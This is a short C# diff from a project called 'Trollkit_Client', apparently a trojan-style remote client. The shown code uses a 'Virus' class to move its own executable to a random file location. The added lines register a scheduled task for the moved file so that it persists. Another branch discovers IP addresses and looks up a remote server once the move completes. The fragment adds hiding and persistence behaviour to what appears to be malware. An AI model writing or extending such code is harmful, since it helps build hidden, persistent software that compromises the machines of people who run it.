@@ -22,7 +22,7 @@ namespace Trollkit_Client
 			if (args.Length > 0)
 				if(args[0] == "move-completed")
 				{
-					Console.WriteLine("Application has been moved to a different location...");
+					BConsole.WriteLine("Application has been moved to a different location...");
 					var program = new Program();
 					var addresses = program.discover.GetIpAddresses();
 					string ip = program.discover.GetRemoteServerIp(addresses);
@@ -34,9 +34,9 @@ namespace Trollkit_Client
 
 			Virus virus = new Virus();
 			string randomLocation = virus.FindRandomFileLocation();
-			Console.WriteLine(AppDomain.CurrentDomain.BaseDirectory + System.AppDomain.CurrentDomain.FriendlyName);
-			Console.WriteLine(randomLocation);
-			virus.moveFileToLocation(randomLocation);
+			string newFileLocation = virus.MoveFileToLocation(randomLocation);
+			BConsole.WriteLine($"New File location: {newFileLocation}");
+			new TaskSchedulerHelper().CreateTask(newFileLocation);
 
 			Console.Read();
 		}
